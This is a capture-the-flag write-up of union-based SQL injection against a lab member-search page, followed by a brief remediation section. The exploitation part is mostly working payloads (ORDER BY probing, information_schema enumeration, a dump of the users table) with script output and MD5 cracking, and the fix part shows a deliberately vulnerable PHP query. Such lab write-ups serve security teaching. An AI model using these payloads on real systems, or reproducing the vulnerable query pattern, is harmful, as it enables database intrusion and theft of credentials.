# SQL injection searchimg

## Exploitation

On the homepage, in the navbar, there is a page named **MEMBERS**. On the page (http://192.168.1.48/?page=member), there is a form for searching member by id

A search with the number `1` returns:

```
ID: 1 
First name: Barack Hussein
Surname : Obama
```

We can check if there is a SQL injection vulnerability by sending and addition. If we send `2-1` and the result is the id `1`, the addition was executed by the SQL request

```
ID: 2-1 
First name: Barack Hussein
Surname : Obama
```

We can use a SQL injection on this form

We need to know the numbers of fields. We will use `ORDER BY` to do this. If we send `1 ORDER BY X` and get an error (no result), the number X of fields is false, we can get the number by increasing it and test

We will using our script to launch injections

```
$ ./exploit.py '1 ORDER BY 2'
['ID: 1 ORDER BY 2 ', 'First name: Barack Hussein', 'Surname : Obama']
$ ./exploit.py '1 ORDER BY 3'
["Unknown column '3' in 'order clause'"]
```

The number of fields is 2

The name of the database

```sql
-1 UNION SELECT 1, database()
```

```
$ ./exploit.py '-1 UNION SELECT 1, database()'
['ID: -1 UNION SELECT 1, database() ', 'First name: 1', 'Surname : Member_Sql_Injection']
```

The name of the database is `Member_Sql_Injection`

Get the tables list

```sql
-1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() 
```

```
$ ./exploit.py '-1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database()'
['ID: -1 UNION SELECT 1, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : users']
```

There is 1 table : `users`

Get the table colums

```sql
-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database() 
```

```
$ ./exploit.py '-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database() '
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : user_id']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : first_name']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : last_name']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : town']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : country']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : planet']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : Commentaire']
['ID: -1 UNION SELECT 1, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database()  ', 'First name: 1', 'Surname : countersign']
```

There is 8 columns:

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

Print all the columns value

```sql
-1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users 
```

```
$ ./exploit.py '-1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users'                          
['ID: -1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users ', 'First name: 1', 'Surname : 1Barack HusseinObamaHonolulu AmericaEARTHAmerca !2b3366bcfd44f540e630d4dc2b9b06d9']
['ID: -1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users ', 'First name: 1', 'Surname : 2AdolfHitlerBerlinAllemagneEarthIch spreche kein Deutsch.60e9032c586fb422e2c16dee6286cf10']
['ID: -1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users ', 'First name: 1', 'Surname : 3JosephStalineMoscouRussiaEarth????? ????????????? ?????????e083b24a01c483437bcf4a9eea7c1b4d']
['ID: -1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users ', 'First name: 1', "Surname : 5FlagGetThe424242Decrypt this password -&gt; then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28"]
```

We can see some instructions to get the flag. Need to decrypt the password, put in lowercase and sha256 the flag

After md5 decoding, the password is `FortyTwo`, in lowercase `fortytwo`, sha256 it!

## How to fix it?

An SQL injection is a sanitization issue. It happens when a SQL request is used with a non sanitized data. For exemple:

```php
$db = new mysqli('localhost', 'root', 'passwd', 'base');
$result = $db->query('SELECT * FROM users WHERE user="'.$_GET['user'].'" AND pass= "'.$_GET['password'].'"');
```

In this exemple, the SQL request is build with the raw GET parameters value. We can inject some SQL in the parameters and change the original request to access/modify some data.

The way to fix it is to ALWAYS sanitize ALL the input data. Never trust the user

To help, in PHP there is some functions to do it, for exemple `mysqli_real_escape_string()`, or you can do it manually.

The better way is to use a framework to manage to Database access for you.

## References

- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/
- https://blog.detectify.com/2016/03/08/what-is-a-sql-injection-and-how-do-you-fix-it/

